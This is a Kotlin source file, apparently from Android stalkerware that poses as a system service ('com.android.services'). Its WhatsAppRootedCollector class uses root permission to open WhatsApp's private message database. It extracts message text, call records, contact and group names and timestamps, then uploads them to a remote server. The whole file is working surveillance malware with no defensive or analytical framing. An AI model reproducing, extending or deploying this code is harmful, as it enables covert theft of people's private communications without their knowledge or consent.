package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.text.TextUtils
import com.android.services.db.entities.WhatsAppRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.acquireWhatsAppDatabasePermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class WhatsAppRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncWhatsApp) {
            try {
                val whatsAppList = retrieveWhatsAppMessages(context, localDatabaseSource)
                if (whatsAppList.isNotEmpty()) {
                    val startDate = whatsAppList[whatsAppList.size - 1].date
                    val endDate = whatsAppList[0].date
                    val mWhatsAppSender = RemoteServerHelper(
                        context,
                        AppConstants.WHATS_APP_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mWhatsAppSender.upload(whatsAppList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.WHATS_APP_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.WHATS_APP_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {
        private fun retrieveWhatsAppMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): List<WhatsAppRooted> {
            var whatsAppList = ArrayList<WhatsAppRooted>()
            try {
                acquireWhatsAppDatabasePermission()
                val msgStoreDb = AppConstants.WHATS_APP_DB_PATH + "msgstore.db"
                val database =
                    SQLiteDatabase.openDatabase(msgStoreDb, null, SQLiteDatabase.OPEN_READONLY)
                val selection: String?
                val selectionArgs: Array<String>?
                val since: String
                val maxTimeStamp = localDatabaseSource.selectWhatsAppRootedMaxTimeStamp() ?: "0"
                since = maxTimeStamp.toString()
                if (since.isNotEmpty()) {
                    selection = String.format("%s > ?", "timestamp")
                    selectionArgs = arrayOf(since)
                } else {
                    selection = null
                    selectionArgs = null
                }

                val cursor = database.query("messages",
                    null,
                    selection,
                    selectionArgs,
                    null,
                    null,
                    null)

                while (cursor.moveToNext()) {
                    try {
                        val messageId = cursor.getString(cursor.getColumnIndex("_id"))
                        val data = cursor.getString(cursor.getColumnIndex("data"))
                        val mediaMimeType = cursor.getString(cursor.getColumnIndex("media_wa_type"))
                        if (!TextUtils.isEmpty(data) || mediaMimeType == "0" || mediaMimeType == "2" || mediaMimeType == "8") {
                            val me = cursor.getString(cursor.getColumnIndex("key_from_me"))
                            val timeStamp = cursor.getString(cursor.getColumnIndex("timestamp"))
                            val conversationId =
                                cursor.getString(cursor.getColumnIndex("key_remote_jid"))
                            var senderNumber: String
                            var message: String
                            var duration: String = ""
                            var senderName: String
                            var isCall = false
                            var conversationName: String = ""
                            if (conversationId.contains("@g") && mediaMimeType == "0") {
                                val remoteResource =
                                    cursor.getString(cursor.getColumnIndex("remote_resource"))
                                senderNumber =
                                    remoteResource?.substring(0, remoteResource.lastIndexOf("@"))
                                        ?: conversationId.substring(0,
                                            conversationId.lastIndexOf("-"))

                                val cur = database.query("chat_list", arrayOf("subject"),
                                    "key_remote_jid=", arrayOf(conversationId), null, null, null)
                                if (cur.moveToFirst()) {
                                    val subject = cur.getString(0)
                                    if (!TextUtils.isEmpty(subject)) conversationName = subject
                                }
                                cur.close()
                                val phNumberName = AppUtils.getContactName(senderNumber, context)
                                senderName =
                                    if (phNumberName == null || phNumberName == "Unknown") {
                                        senderNumber
                                    } else {
                                        phNumberName
                                    }
                            } else {
                                senderNumber =
                                    conversationId.substring(0, conversationId.lastIndexOf("@"))
                                val phNumberName = AppUtils.getContactName(senderNumber, context)
                                if (phNumberName == null || phNumberName == "Unknown") {
                                    conversationName = senderNumber
                                    senderName = senderNumber
                                } else {
                                    conversationName = phNumberName
                                    senderName = phNumberName
                                }
                            }
                            if (mediaMimeType == "2" || mediaMimeType == "8") {
                                message = AppUtils.convertStringToBase64("no message")
                                isCall = true
                                duration = cursor.getString(cursor.getColumnIndex("media_duration"))
                            } else {
                                message = AppUtils.convertStringToBase64(data)
                            }
                            val type: String = if (me == "0") "INCOMING" else "OUTGOING"
                            val whatsAppRooted = WhatsAppRooted()
                            whatsAppRooted.apply {
                                this.messageId = messageId
                                this.conversationId = conversationId
                                this.conversationName = conversationName
                                this.message = message
                                this.type = type
                                this.messageDatetime = AppUtils.formatTime(timeStamp)
                                this.senderNumber = senderNumber
                                this.isCall = isCall
                                this.duration = duration
                                this.timeStamp = timeStamp.toLong()
                                this.date = AppUtils.getDate(timeStamp.toLong())
                            }
                            whatsAppList.add(whatsAppRooted)
                        }
                    } catch (e: Exception) {
                        logVerbose(
                            "${AppConstants.WHATS_APP_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                            throwable = e
                        )
                    }
                }
                cursor.close()
                database.close()
                logVerbose("${AppConstants.WHATS_APP_ROOTED_TYPE} rooted list = $whatsAppList")
                if (whatsAppList.isNotEmpty())
                    localDatabaseSource.insertWhatsAppRooted(whatsAppList)
                localDatabaseSource.selectWhatsAppRooted {
                    whatsAppList = it as ArrayList<WhatsAppRooted>
                }
                logVerbose("${AppConstants.WHATS_APP_ROOTED_TYPE} selected list = $whatsAppList")
            } catch (e: Exception) {
                logVerbose(
                    "${AppConstants.WHATS_APP_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return whatsAppList
        }
    }
}